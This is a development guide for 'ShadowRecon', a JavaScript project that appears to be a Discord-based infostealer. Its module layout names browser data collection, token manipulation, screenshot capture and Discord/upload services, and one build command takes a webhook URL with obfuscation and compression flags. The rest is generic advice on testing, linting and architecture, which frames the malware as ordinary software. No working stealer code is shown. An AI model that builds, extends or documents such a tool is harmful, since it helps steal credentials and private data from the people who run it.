# Development Guide

This document provides detailed information for developers working on ShadowRecon.

## Project Structure

```
src/
├── config/           # Configuration management
│   └── config.js     # Main configuration loader
├── core/             # Core utilities and systems
│   ├── embedBuilder.js   # Discord embed builder
│   ├── encryption.js     # Encryption utilities
│   ├── errors.js         # Error handling system
│   ├── fileManager.js    # File operations manager
│   ├── logger.js         # Logging system
│   ├── serviceManager.js # Service dependency injection
│   ├── statistics.js     # Statistics collection
│   ├── tokenUtils.js     # Token manipulation utilities
│   └── utils.js          # General utilities
├── modules/          # Feature modules
│   ├── browsers/     # Browser data collection
│   └── screenshot/   # Screenshot capture
├── services/         # External services
│   ├── discord/      # Discord integration
│   └── upload/       # File upload services
└── main.js          # Application entry point
```

## Development Setup

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Run tests:**
   ```bash
   npm test
   npm run test:coverage  # With coverage report
   npm run test:watch     # Watch mode
   ```

3. **Code quality:**
   ```bash
   npm run lint           # Fix linting issues
   npm run lint:check     # Check linting
   npm run format         # Format code
   npm run validate       # Full validation
   ```

## Architecture Overview

### Service Manager
The application uses a dependency injection container that manages service lifecycle:

```javascript
// Register services with dependencies
serviceManager.register('serviceA', () => new ServiceA(), []);
serviceManager.register('serviceB', () => new ServiceB(), ['serviceA']);

// Initialize all services
await serviceManager.initialize();

// Access services
const serviceA = serviceManager.getService('serviceA');
```

### Core Utilities
The `CoreUtils` class provides optimized utility functions:

- **Cryptographically secure random generation**
- **Async file operations with concurrency control**
- **Batch processing capabilities**
- **Retry logic with exponential backoff**
- **Rate limiting functionality**

### File Manager
Enhanced file management with both sync and async APIs:

```javascript
// Async operations (recommended)
await fileManager.saveAsync(sourcePath, 'Documents', 'UserData');
await fileManager.saveJsonAsync(data, 'Data', 'config.json');

// Sync operations (legacy)
fileManager.saveSync(sourcePath, 'Documents', 'UserData');
fileManager.saveJson(data, 'Data', 'config.json');
```

## Performance Optimizations

### 1. Cryptographic Functions
- Uses `crypto.randomBytes()` instead of `Math.random()` for secure random generation
- Implements secure password generation with proper entropy

### 2. File Operations
- Async operations with configurable concurrency limits
- Batch processing for multiple files
- Progress tracking and statistics

### 3. Network Operations
- Automatic retry with exponential backoff
- Request caching for IP lookup
- Fallback services for reliability

### 4. Memory Management
- Proper cleanup of resources
- Service lifecycle management
- Error boundary isolation

## Testing Strategy

### Unit Tests
Located in `tests/` directory, covering:
- Core utilities
- Service manager
- Configuration management
- Logger functionality

### Test Structure
```javascript
describe('Module Name', () => {
    beforeEach(() => {
        // Setup
    });

    afterEach(() => {
        // Cleanup
    });

    test('should do something', () => {
        // Test implementation
    });
});
```

### Coverage Goals
- Maintain >80% code coverage
- Critical paths should have >95% coverage
- All public APIs should be tested

## Code Quality Standards

### ESLint Configuration
- Enforces consistent code style
- Prevents common JavaScript pitfalls
- Ensures best practices

### Prettier Configuration
- Consistent code formatting
- Automatic code formatting on save

### Error Handling
- Use the centralized `ErrorHandler` class
- Implement proper error boundaries
- Log errors with context information

## Build Process

### Development Build
```bash
npm run dev
```

### Production Build
```bash
npm run build
```

### Build with Obfuscation
```bash
./build.sh https://webhook-url.com AppName --obfuscate --compress
```

## Contributing Guidelines

1. **Code Style:**
   - Follow ESLint rules
   - Use meaningful variable names
   - Add JSDoc comments for public methods

2. **Testing:**
   - Write tests for new features
   - Ensure all tests pass before committing
   - Maintain or improve code coverage

3. **Documentation:**
   - Update this guide for new features
   - Add inline documentation for complex logic
   - Update README.md for user-facing changes

4. **Performance:**
   - Profile critical paths
   - Use async operations where appropriate
   - Implement proper resource cleanup

## Debugging

### Enable Debug Logging
```bash
cross-env LOG_LEVEL=DEBUG npm start
```

### Common Issues

1. **Service not found errors:**
   - Check service registration in `serviceManager.js`
   - Ensure proper dependency order

2. **File operation failures:**
   - Check permissions
   - Verify paths exist
   - Review error logs

3. **Build failures:**
   - Clear `node_modules` and reinstall
   - Check for dependency conflicts
   - Verify Node.js version compatibility

## Performance Monitoring

The application includes built-in performance tracking:

- File operation statistics
- Service health monitoring
- Error rate tracking
- Memory usage monitoring

Access performance data through the service manager's health check API.